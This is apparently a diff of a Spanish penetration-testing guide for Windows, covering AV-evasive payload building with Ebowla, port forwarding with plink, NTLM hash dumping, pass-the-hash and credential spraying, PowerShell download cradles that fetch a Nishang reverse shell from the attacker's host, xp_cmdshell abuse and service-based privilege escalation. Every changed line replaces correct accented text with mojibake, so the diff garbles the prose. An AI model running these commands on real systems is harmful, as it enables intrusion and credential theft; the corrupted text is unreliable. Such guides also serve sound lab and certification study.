@@ -3688,7 +3687,7 @@ output_type = GO
 payload_type = EXE
 ```
 
-Una vez hecho, bajamos hasta la sección de variables de entorno:
+Una vez hecho, bajamos hasta la secciÃ³n de variables de entorno:
 
 ```bash
     [[ENV_VAR]]
@@ -3711,7 +3710,7 @@ Una vez hecho, bajamos hasta la sección de variables de entorno:
 
 ```
 
-En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:
+En este caso, dado que a modo de ejemplo vamos a jugar Ãºnicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:
 
 
 ```bash
@@ -3735,13 +3734,13 @@ En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variab
 
 ```
 
-**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a través de las propias variables de entorno. Esto quiere decir, que tras la ejecución del binario en la máquina comprometida, este se encargará de descifrar todo el ejecutable a través de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecución del binario no será funcional.
+**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a travÃ©s de las propias variables de entorno. Esto quiere decir, que tras la ejecuciÃ³n del binario en la mÃ¡quina comprometida, este se encargarÃ¡ de descifrar todo el ejecutable a travÃ©s de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecuciÃ³n del binario no serÃ¡ funcional.
 
 Una vez hecho, aplicamos el siguiente comando desde consola:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
-└──╼ #python ebowla.py shell.exe genetic.config 
+â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
+â””â”€â”€â•¼ #python ebowla.py shell.exe genetic.config 
 [*] Using Symmetric encryption
 [*] Payload length 73802
 [*] Payload_type exe
@@ -3757,11 +3756,11 @@ Una vez hecho, aplicamos el siguiente comando desde consola:
 [*] Writing GO payload to: go_symmetric_shell.exe.go
 ```
 
-Este paso, lo que hará será crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:
+Este paso, lo que harÃ¡ serÃ¡ crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
-└──╼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
+â””â”€â”€â•¼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
 [*] Copy Files to tmp for building
 [*] Building...
 [*] Building complete
@@ -3771,41 +3770,41 @@ Este paso, lo que hará será crearnos un archivo **go_symmetric_shell.exe.go** 
 
 ```
 
-Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la máquina Windows.
+Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la mÃ¡quina Windows.
 
-Es importante que la ruta del binario **go** esté configurada en el _PATH_, pues en caso contrario no lo encontrará. Si queremos que funcione de manera temporal para la ejecución del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:
+Es importante que la ruta del binario **go** estÃ© configurada en el _PATH_, pues en caso contrario no lo encontrarÃ¡. Si queremos que funcione de manera temporal para la ejecuciÃ³n del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:
 
 ```bash
 export PATH=/usr/local/go/bin:$PATH
 ```
 
-Obviamente, cuantas más variables de entorno utilicemos mejor será nuestro _AV Evasion_.
+Obviamente, cuantas mÃ¡s variables de entorno utilicemos mejor serÃ¡ nuestro _AV Evasion_.
 
 #### Windows Port Forwarding
 
-Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseña que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexión desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.
+Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseÃ±a que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexiÃ³n desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.
 
 Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario **plink.exe** para llevar a cabo el procedimiento.
 
-Lo único que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.
+Lo Ãºnico que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.
 
-Cuando todo esté configurado correctamente, desde la máquina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra máquina local:
+Cuando todo estÃ© configurado correctamente, desde la mÃ¡quina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra mÃ¡quina local:
 
 ```bash
-plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciónIP
+plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciÃ³nIP
 ```
 
-Automáticamente, se entablará la conexión hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra máquina.
+AutomÃ¡ticamente, se entablarÃ¡ la conexiÃ³n hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra mÃ¡quina.
 
-Ahora la idea es llevar a cabo la autenticación desde nuestra máquina al propio servicio local, el cual enruta al servicio samba de la máquina Windows. Suponiendo que la contraseña del usuario administrador es '**test123**', aplicamos el siguiente comando en local:
+Ahora la idea es llevar a cabo la autenticaciÃ³n desde nuestra mÃ¡quina al propio servicio local, el cual enruta al servicio samba de la mÃ¡quina Windows. Suponiendo que la contraseÃ±a del usuario administrador es '**test123**', aplicamos el siguiente comando en local:
 
 ```bash
 /usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe
 ```
 
-Una vez aplicado el comando, veremos cómo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).
+Una vez aplicado el comando, veremos cÃ³mo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).
 
-Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la máquina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.
+Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la mÃ¡quina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.
 
 Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:
 
@@ -3815,7 +3814,7 @@ cme smb ip --gen-relay-list ip
 
 #### Hashdump Manual
 
-Desde Metasploit, uno está acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, así como el auxiliar. A continuación se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.
+Desde Metasploit, uno estÃ¡ acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, asÃ­ como el auxiliar. A continuaciÃ³n se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.
 
 Es tan sencillo como traerse con privilegios de administrador, los recursos **SAM** y **System** del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:
 
@@ -3827,7 +3826,7 @@ Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente
 
 #### PassTheHash
 
-A la hora de contar con un Hash NTLM válido de usuario, por ejemplo para este caso práctico, de Administrador, podemos llevar a cabo una autenticación contra el sistema a fin de conseguir una Shell interactiva a través del servicio Samba.
+A la hora de contar con un Hash NTLM vÃ¡lido de usuario, por ejemplo para este caso prÃ¡ctico, de Administrador, podemos llevar a cabo una autenticaciÃ³n contra el sistema a fin de conseguir una Shell interactiva a travÃ©s del servicio Samba.
 
 Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permite hacer conexiones como la siguiente:
 
@@ -3835,19 +3834,19 @@ Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permit
 pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe
 ```
 
-Como es de obviar, este paso nos ahorra el tener que crackear la contraseña. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:
+Como es de obviar, este paso nos ahorra el tener que crackear la contraseÃ±a. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:
 
 ```bash
 crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 
 ```
 
-Obteniendo un **pwned** en caso de lograr la autenticación para algunos de los Hosts probados. A su vez, su uso puede ser útil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:
+Obteniendo un **pwned** en caso de lograr la autenticaciÃ³n para algunos de los Hosts probados. A su vez, su uso puede ser Ãºtil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:
 
 ```bash
 crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz
 ```
 
-También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía **RDP**:
+TambiÃ©n habrÃ­a servido contra todo el rango /24. Su uso tambiÃ©n puede ser utilizado incluso para en caso de no conocer la contraseÃ±a en claro, realizar autenticaciones vÃ­a **RDP**:
 
 ```bash
 xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
@@ -3855,23 +3854,23 @@ xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:
 
 #### Enumeration and Privilege Escalation
 
-Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeración que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.
+Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeraciÃ³n que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.
 
-Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rápida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseñas en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el módulo y luego lo ejecutan... yo lo suelo hacer todo de una.
+Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rÃ¡pida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseÃ±as en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el mÃ³dulo y luego lo ejecutan... yo lo suelo hacer todo de una.
 
 Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:
 
 ```bash
-┌─[root@parrot]─[/opt/PowerSploit/Privesc]
-└──╼ #cat PowerUp.ps1 | grep AllChecks  | grep "function" | tr -d '{'
+â”Œâ”€[root@parrot]â”€[/opt/PowerSploit/Privesc]
+â””â”€â”€â•¼ #cat PowerUp.ps1 | grep AllChecks  | grep "function" | tr -d '{'
 function Invoke-AllChecks 
 
 ```
 
-Para poder ejecutarla de un solo tirón, añadimos una llamada a dicha función al final de nuestro script:
+Para poder ejecutarla de un solo tirÃ³n, aÃ±adimos una llamada a dicha funciÃ³n al final de nuestro script:
 
 ```bash
-# Últimas líneas del script
+# Ãšltimas lÃ­neas del script
 
 $Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
 $Advapi32 = $Types['advapi32']
@@ -3886,15 +3885,15 @@ Por tanto, una vez con esto preparado, compartimos un servidor con Python en nue
 powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')
 ```
 
-Esperamos unos segundos, y obtendremos directamente los resultados de la ejecución del script.
+Esperamos unos segundos, y obtendremos directamente los resultados de la ejecuciÃ³n del script.
 
-En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeración, donde se nos listarán en base al análisis efectuado un puñado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sólo que en este caso, la función a añadir en la última línea sería **Find-AllVulns**.
+En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeraciÃ³n, donde se nos listarÃ¡n en base al anÃ¡lisis efectuado un puÃ±ado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sÃ³lo que en este caso, la funciÃ³n a aÃ±adir en la Ãºltima lÃ­nea serÃ­a **Find-AllVulns**.
 
 #### PowerShell Reverse Shell
 
-Para los amantes de PowerShell que no viven sin su sesión PS, por aquí os explico una técnica para conseguir acceso al sistema con sesión PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.
+Para los amantes de PowerShell que no viven sin su sesiÃ³n PS, por aquÃ­ os explico una tÃ©cnica para conseguir acceso al sistema con sesiÃ³n PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.
 
-Añadimos al final del script la siguiente línea:
+AÃ±adimos al final del script la siguiente lÃ­nea:
 
 `Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443`
 
@@ -3904,37 +3903,37 @@ Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso 
 powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')
 ```
 
-En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía **PowerShell**.
+En cuestiÃ³n de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vÃ­a **PowerShell**.
 
 #### Manual Migration Process
 
-Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darán montón de falsos positivos.
+Aunque las mÃ¡quinas Windows del examen suelen ser de 32 bits, como mÃ¡s vale prevenir que curar detallo una tÃ©cnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeraciÃ³n del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la mÃ¡quina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darÃ¡n montÃ³n de falsos positivos.
 
-El saber con qué aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a través de las siguientes consultas:
+El saber con quÃ© aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a travÃ©s de las siguientes consultas:
 
 `[Environment]::Is64BitOperatingSystem`
 
 `[Environment]::Is64BitProcess`
 
-Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:
+Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo Ãºnico que tendremos que hacer es por ejemplo ganando sesiÃ³n por Powershell invocar al mismo desde la siguiente ruta:
 
 ```bash
 C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')
 ```
 
-Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.
+Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en quÃ© proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverÃ¡ un **True**, pudiendo ya proseguir con la enumeraciÃ³n a nivel de sistema.
 
 #### RCE Filter Evasion Microsoft SQL
 
-El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vía **sqsh** o a través del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.
+El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vÃ­a **sqsh** o a travÃ©s del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.
 
-En caso de contar con credenciales válidas, podemos realizar la autenticación al servicio via **sqsh** de la siguiente forma:
+En caso de contar con credenciales vÃ¡lidas, podemos realizar la autenticaciÃ³n al servicio via **sqsh** de la siguiente forma:
 
 ```bash
 sqsh -S 192.168.1.X -U sa -P superPassword
 ```
 
-En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parámetro **-P**.
+En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parÃ¡metro **-P**.
 
 Una vez conectados, podemos realizar las siguientes instrucciones:
 
@@ -3945,7 +3944,7 @@ Una vez conectados, podemos realizar las siguientes instrucciones:
 nt authority\ system
 ```
 
-Puede ser que se de el caso donde tras lanzar la instrucción **go**, se nos presente un mensaje que nos avisa de que el componente está deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:
+Puede ser que se de el caso donde tras lanzar la instrucciÃ³n **go**, se nos presente un mensaje que nos avisa de que el componente estÃ¡ deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:
 
 ```bash
 1> EXEC SP_CONFIGURE 'show advanced options', 1
@@ -3964,7 +3963,7 @@ Y ya lograremos ejecutar comandos sobre el sistema.
 
 #### mssqlclient Impacket
 
-El recurso lo podemos obtener [aquí](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), y su uso es similar al de **psexec**. En mi caso, lo uso cuando han cambiado el puerto por defecto:
+El recurso lo podemos obtener [aquÃ­](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), y su uso es similar al de **psexec**. En mi caso, lo uso cuando han cambiado el puerto por defecto:
 
 ```bash
 python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
@@ -3974,7 +3973,7 @@ Posteriormente, las consultas se hacen igual a las descritas en el anterior punt
 
 #### Reconocimiento del Sistema
 
-Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeración manual, redireccionando todo a un fichero de reportes:
+Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeraciÃ³n manual, redireccionando todo a un fichero de reportes:
 
 ```bash
  @echo --------- BASIC WINDOWS RECON ---------  > report.txt
@@ -4032,13 +4031,13 @@ Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llev
  echo REPORT COMPLETE!
 ```
 
-A su vez, podemos hacer del recurso [wmic-info](https://github.com/ankh2054/windows-pentest/blob/master/wmic-info) a fin de obtener información acerca del sistema.
+A su vez, podemos hacer del recurso [wmic-info](https://github.com/ankh2054/windows-pentest/blob/master/wmic-info) a fin de obtener informaciÃ³n acerca del sistema.
 
-Otra opción, es utilizar [icacls.bat](https://github.com/ankh2054/windows-pentest/blob/master/icacls.bat), para la enumeración de permisos débiles a nivel de sistema.
+Otra opciÃ³n, es utilizar [icacls.bat](https://github.com/ankh2054/windows-pentest/blob/master/icacls.bat), para la enumeraciÃ³n de permisos dÃ©biles a nivel de sistema.
 
-Una buena herramienta a utilizar para la enumeración de permisos débiles asignados sobre archivos que son ejecutados a través de tareas en intervalos regulares de tiempo es [schcheck.bat](https://github.com/ankh2054/windows-pentest/blob/master/schcheck.bat)
+Una buena herramienta a utilizar para la enumeraciÃ³n de permisos dÃ©biles asignados sobre archivos que son ejecutados a travÃ©s de tareas en intervalos regulares de tiempo es [schcheck.bat](https://github.com/ankh2054/windows-pentest/blob/master/schcheck.bat)
 
-A continuación, se detallan algunos usos de *accesschk.exe*, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.
+A continuaciÃ³n, se detallan algunos usos de *accesschk.exe*, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.
 
 ```bash
 
@@ -4059,7 +4058,7 @@ accesschk -wuo everyone \basednamedobjects
 
 #### Kernel Exploits Windows
 
-A continuación, se enumeran distintos exploits de Kernel interesantes a usar que en más de una ocasión han funcionado en las máquinas del lab. Así mismo es recomendable llevarlos siempre bajo la manga:
+A continuaciÃ³n, se enumeran distintos exploits de Kernel interesantes a usar que en mÃ¡s de una ocasiÃ³n han funcionado en las mÃ¡quinas del lab. AsÃ­ mismo es recomendable llevarlos siempre bajo la manga:
 
 * [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
 * [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
@@ -4067,30 +4066,30 @@ A continuación, se enumeran distintos exploits de Kernel interesantes a usar qu
 
 #### Privilege Escalation Enumerations
 
-A continuación, se detalla una enumeración básica del sistema.
+A continuaciÃ³n, se detalla una enumeraciÃ³n bÃ¡sica del sistema.
 
-**Información Básica**
+**InformaciÃ³n BÃ¡sica**
 
 ```bash
 systeminfo
 hostname
 ```
 
-**¿Quiénes somos?**
+**Â¿QuiÃ©nes somos?**
 
 ```bash
 whoami
 echo %username%
 ```
 
-**¿Qué usuarios y grupos locales existen en el sistema?**
+**Â¿QuÃ© usuarios y grupos locales existen en el sistema?**
 
 ```bash
 net users
 net localgroups
 ```
 
-**Enumerar información de usuario, interesante para ver si el usuario posee privilegios**
+**Enumerar informaciÃ³n de usuario, interesante para ver si el usuario posee privilegios**
 
 ```bash
 net user usuario
@@ -4123,13 +4122,13 @@ route print
 arp -A
 ```
 
-**¿Cómo de bien está parcheado el sistema?**
+**Â¿CÃ³mo de bien estÃ¡ parcheado el sistema?**
 
 ```bash
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
-**Búsqueda de Contraseñas en Texto Claro sobre el Sistema**
+**BÃºsqueda de ContraseÃ±as en Texto Claro sobre el Sistema**
 
 ```bash
 findstr /si password *.txt
@@ -4142,7 +4141,7 @@ findstr /spin "password" *.*
 findstr /spin "password" *.*
 ```
 
-**Búsqueda de Contraseñas en Texto Claro sobre Archivos**
+**BÃºsqueda de ContraseÃ±as en Texto Claro sobre Archivos**
 
 Es probable que nos las encontremos en Base64:
 
@@ -4158,7 +4157,7 @@ dir c:\*ultravnc.ini /s /b
 dir c:\ /s /b | findstr /si *vnc.ini
 ```
 
-**Búsqueda de Contraseñas en Texto Claro Almacenadas en Registro**
+**BÃºsqueda de ContraseÃ±as en Texto Claro Almacenadas en Registro**
 
 ```bash
 # VNC
@@ -4173,7 +4172,7 @@ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 # Putty
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 
-# Búsqueda de Contraseñas almacenadas en Registro
+# BÃºsqueda de ContraseÃ±as almacenadas en Registro
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -4193,12 +4192,12 @@ sc config upnphost obj= ".\LocalSystem" password= ""
 sc config upnphost depend= ""
 ```
 
-**Búsqueda de Permisos Débiles**
+**BÃºsqueda de Permisos DÃ©biles**
 
 ```bash
 wmic service list brief
 
-# El comando anterior generará montón de contenido, por lo tanto, una buena práctica es parsear los resultados. Lo hacemos en los siguiente pasos.
+# El comando anterior generarÃ¡ montÃ³n de contenido, por lo tanto, una buena prÃ¡ctica es parsear los resultados. Lo hacemos en los siguiente pasos.
 
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 
@@ -4213,7 +4212,7 @@ FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
 
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
 
-# Procesamos a continuación cada uno de los resultados obtenidos vía cacls
+# Procesamos a continuaciÃ³n cada uno de los resultados obtenidos vÃ­a cacls
 
 cacls "C:\path\to\file.exe"
 ```
@@ -4228,9 +4227,9 @@ BUILTIN\Administrators:F
 NT AUTHORITY\SYSTEM:F
 ```
 
-Esto querá decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiéndonos de esta forma incrustrar un ejecutable malicioso. 
+Esto querÃ¡ decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiÃ©ndonos de esta forma incrustrar un ejecutable malicioso. 
 
-A continuación, se representa un ejemplo de código en C para un simple **getsuid**:
+A continuaciÃ³n, se representa un ejemplo de cÃ³digo en C para un simple **getsuid**:
 
 ```bash
 #include <stdlib.h>
@@ -4242,13 +4241,13 @@ return 0;
 }
 ```
 
-Compilamos el mismo haciendo uso de la siguiente sintáxis:
+Compilamos el mismo haciendo uso de la siguiente sintÃ¡xis:
 
 ```bash
 i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
 ```
 
-Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vía **wmic** o **net**, de la siguiente forma:
+Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vÃ­a **wmic** o **net**, de la siguiente forma:
 
 ```bash
 wmic service NAMEOFSERVICE call startservice
@@ -4258,7 +4257,7 @@ net stop [service name] && net start [service name].
 
 **Unquoted Service Paths**
 
-Esta técnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:
+Esta tÃ©cnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:
 
 ```bash
 # Usando WMIC
@@ -4269,7 +4268,7 @@ sc query
 sc qc service name
 ```
 
-Si la ruta de alguno de los servicios listados contienen un espacio y no están doblemente encomillados, el servicio es vulnerable.
+Si la ruta de alguno de los servicios listados contienen un espacio y no estÃ¡n doblemente encomillados, el servicio es vulnerable.
 
 Suponiendo que la ruta fuera esta a modo de ejemplo:
 
@@ -4277,15 +4276,15 @@ Suponiendo que la ruta fuera esta a modo de ejemplo:
 c:\Program Files\something\winamp.exe
 ```
 
-Podríamos depositar un binario tal que así:
+PodrÃ­amos depositar un binario tal que asÃ­:
 
 ```bash
 c:\program.exe
 ```
 
-Tras reiniciar el servicio, lo que sucederá es que tomará como binario a ejecutar el situado en **c:\program.exe** en vez del que debería, permitiendo así llevar a cabo una ejecución con posibilidad de alto privilegio sobre el mismo.
+Tras reiniciar el servicio, lo que sucederÃ¡ es que tomarÃ¡ como binario a ejecutar el situado en **c:\program.exe** en vez del que deberÃ­a, permitiendo asÃ­ llevar a cabo una ejecuciÃ³n con posibilidad de alto privilegio sobre el mismo.
 
-**Módulos interesantes de Post-Explotación desde Metasploit**
+**MÃ³dulos interesantes de Post-ExplotaciÃ³n desde Metasploit**
 
 ```bash
 use exploit/windows/local/service_permissions
